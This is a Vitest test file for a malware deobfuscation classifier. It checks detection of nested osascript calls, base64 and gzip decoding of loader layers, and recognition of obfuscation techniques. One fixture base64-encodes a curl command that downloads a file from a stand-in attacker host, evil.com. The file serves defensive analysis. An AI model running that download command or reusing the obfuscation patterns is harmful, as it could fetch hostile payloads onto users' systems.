import { describe, it, expect } from 'vitest';
import { gzipSync } from 'node:zlib';
import { isLayer, guessTechnique, decodeBase64Layer, decodeBase64LayerSync } from '../src/classifier';

describe('isLayer', () => {
  it('flags a nested osascript invocation', async () => {
    expect(await isLayer(`osascript -l JavaScript -e 'x'`)).toBe(true);
  });
  it('flags a long printable base64 blob', async () => {
    const b64 = Buffer.from('curl https://evil.com/a -o /tmp/x').toString('base64');
    expect(await isLayer(b64)).toBe(true);
  });
  it('does not flag a finished shell command', async () => {
    expect(await isLayer('cd /tmp && open dl.zip')).toBe(false);
  });
});

describe('decodeBase64Layer', () => {
  it('decodes UTF-8 payloads without latin-1 mojibake', async () => {
    const text = 'echo "café ☕ déjà vu — multibyte"';
    const b64 = Buffer.from(text, 'utf8').toString('base64');
    expect(await decodeBase64Layer(b64)).toBe(text);
  });

  it('returns null for a non-base64 / too-short string', async () => {
    expect(await decodeBase64Layer('open dl.zip')).toBeNull();
  });

  it('gunzips a gzip+base64 stage-1 loader blob', async () => {
    const inner = '"echo \'gzip-stage1-ok-and-long-enough-for-the-min-length-check\'"';
    const gz = gzipSync(Buffer.from(inner));
    const b64 = gz.toString('base64');
    expect(await decodeBase64Layer(b64)).toBe(inner);
  });
});

describe('decodeBase64LayerSync', () => {
  it('decodes plain base64 without awaiting (used by iocs.ts, which cannot await)', () => {
    const text = 'plain text long enough to clear the min-length gate';
    const b64 = Buffer.from(text).toString('base64');
    const result = decodeBase64LayerSync(b64);
    expect(result).toBe(text);
  });
});

describe('guessTechnique', () => {
  it('detects xor', () => {
    expect(guessTechnique('r+=String.fromCharCode(parseInt(d,16)^k)')).toBe('xor');
  });
  it('detects base64', () => {
    expect(guessTechnique('atob("AAAA")')).toBe('base64');
  });
  it('detects reverse', () => {
    expect(guessTechnique('s.split("").reverse().join("")')).toBe('reverse');
  });
  it('falls back to plain', () => {
    expect(guessTechnique('var x = 1; x')).toBe('plain');
  });
  it('detects array-subtraction arithmetic obfuscation, distinct from xor (#42)', () => {
    const src = 'var k=7,a=[118,119];var r="";for(var i=0;i<a.length;i++)r+=String.fromCharCode(a[i]-k);r';
    expect(guessTechnique(src)).toBe('arithmetic');
  });
});
